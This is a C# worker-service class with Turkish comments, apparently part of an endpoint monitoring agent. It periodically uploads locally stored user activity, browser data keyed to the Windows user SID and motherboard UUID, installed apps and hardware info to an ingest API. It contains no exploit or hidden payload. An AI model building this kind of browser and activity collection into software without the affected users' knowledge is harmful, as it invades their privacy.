using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;

namespace WorkerService1.Services
{
    /// <summary>
    /// JSONL depolamadan okunan verileri periyodik olarak API'ye gönderir.
    /// Yalnızca orkestrasyon yapar: ayarlar, taşıma, şifreleme ve dönüşüm ayrı sınıflardadır.
    /// </summary>
    public class DataSyncService : IDisposable
    {
        private readonly ILogger<DataSyncService> _logger;
        private readonly ISyncStorage _storage;
        private readonly IIngestClient _client;
        private readonly DataSyncOptions _options;
        private readonly SemaphoreSlim _syncLock = new(1, 1);
        private readonly Timer _timer;

        public DataSyncService(
            ILogger<DataSyncService> logger,
            DataSyncOptions options,
            ISyncStorage storage,
            IIngestClient client)
        {
            _logger = logger;
            _options = options;
            _storage = storage;
            _client = client;

            if (_options.IsConfigured)
            {
                _timer = new Timer(_ => _ = SyncCallbackAsync(), null,
                    TimeSpan.FromSeconds(30), TimeSpan.FromMinutes(_options.SyncIntervalMinutes));
                _logger.LogInformation("DataSync enabled (interval {Min} min)", _options.SyncIntervalMinutes);
            }
            else
            {
                _timer = new Timer(_ => { }, null, Timeout.Infinite, Timeout.Infinite);
                _logger.LogWarning("DataSync disabled or API url/token/key not configured");
            }
        }

        private async Task SyncCallbackAsync()
        {
            try { await SyncDataAsync(); }
            catch (Exception ex) { _logger.LogError(ex, "Error in sync callback"); }
        }

        public async Task SyncDataAsync()
        {
            if (!_options.IsConfigured) return;
            if (!await _syncLock.WaitAsync(0)) return;

            try
            {
                var n = _options.BatchSize;

                var activities = await _storage.GetUnsyncedActivitiesAsync(n);
                await SyncAsync("activities", activities, () => SyncDtoMapper.ToDtos(activities),
                    activities.Select(a => a.SourceFile), _storage.MarkActivitiesAsSyncedAsync);

                var browser = await _storage.GetUnsyncedBrowserDataAsync(n);
                await SyncAsync("browser", browser,
                    () => SyncDtoMapper.ToDtos(browser,
                        SystemIdentityHelper.GetCurrentUserSid(), SystemIdentityHelper.GetMotherboardUuid()),
                    browser.Select(b => b.SourceFile), _storage.MarkBrowserDataAsSyncedAsync);

                var apps = await _storage.GetUnsyncedInstalledAppsAsync(n);
                await SyncAsync("apps", apps, () => SyncDtoMapper.ToDtos(apps),
                    apps.Select(a => a.SourceFile), _storage.MarkInstalledAppsAsSyncedAsync);

                var hw = await _storage.GetUnsyncedSystemHardwareAsync(n);
                await SyncAsync("hardware", hw, () => SyncDtoMapper.ToDtos(hw),
                    hw.Select(h => h.SourceFile), _storage.MarkSystemHardwareAsSyncedAsync);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error during data sync");
            }
            finally
            {
                _syncLock.Release();
            }
        }

        // Dört veri türü için ortak akış: gönder, başarılıysa kaynak dosyaları işaretle.
        private async Task SyncAsync<TSrc, TDto>(
            string type, List<TSrc> source, Func<List<TDto>> toDtos,
            IEnumerable<string?> sourceFiles, Func<List<string>, Task> markSynced)
        {
            if (source.Count == 0) return;
            if (!await _client.SendAsync(type, toDtos())) return;
            if (!_options.DeleteAfterSync) return;

            await markSynced(sourceFiles.Where(f => f != null).Select(f => f!).ToList());
        }

        public Task TriggerSyncAsync() => SyncDataAsync();

        public void Dispose()
        {
            _timer.Dispose();
            _syncLock.Dispose();
        }
    }
}
